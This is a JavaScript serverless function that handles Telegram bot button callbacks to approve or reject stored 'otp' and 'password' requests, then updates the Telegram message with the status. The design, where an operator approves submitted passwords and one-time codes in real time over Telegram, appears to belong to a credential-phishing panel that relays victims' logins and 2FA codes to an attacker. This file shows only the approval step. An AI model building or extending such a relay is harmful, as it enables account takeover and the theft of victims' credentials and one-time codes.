import { makeJsonResponse, getRequestFromKV, setRequestInKV } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const update = body;
  if (!update || !update.callback_query) {
    return makeJsonResponse({ ok: true });
  }

  const callbackQuery = update.callback_query;
  const data = new URLSearchParams(callbackQuery.data);
  const requestId = data.get("requestId");
  const action = data.get("action");
  const token = data.get("token");

  if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
    return makeJsonResponse({ ok: false, error: "Invalid token" }, 401);
  }

  // Try OTP first, then password
  let item = await getRequestFromKV(env, requestId, "otp");
  let type = "otp";
  
  if (!item) {
    item = await getRequestFromKV(env, requestId, "password");
    type = "password";
  }

  if (!item) {
    return makeJsonResponse({ ok: false, error: "Request not found" }, 404);
  }

  if (action === "approve") {
    item.approved = true;
    item.rejectedReason = null;
  } else if (action === "reject") {
    item.rejectedReason = "Admin rejected";
    item.approved = false;
  }

  await setRequestInKV(env, requestId, item, type);

  // Answer the callback query
  const answerPayload = {
    callback_query_id: callbackQuery.id,
    text: action === "approve" ? "Request approved ✅" : "Request rejected ❌",
    show_alert: false,
  };

  const answerUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
  try {
    await fetch(answerUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(answerPayload),
    });
  } catch (err) {
    console.error("Failed to answer callback query", err);
  }

  // Edit the message to show the result
  const editPayload = {
    chat_id: callbackQuery.message.chat.id,
    message_id: callbackQuery.message.message_id,
    text: `${callbackQuery.message.text}\n\n<b>Status: ${action === "approve" ? "APPROVED ✅" : "REJECTED ❌"}</b>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: action === "approve" ? "✅ APPROVED" : "❌ REJECTED",
            callback_data: "noop", // Disabled button
          },
        ],
      ],
    },
  };

  const editUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/editMessageText`;
  try {
    await fetch(editUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(editPayload),
    });
  } catch (err) {
    console.error("Failed to edit message", err);
  }

  return makeJsonResponse({ ok: true });
}
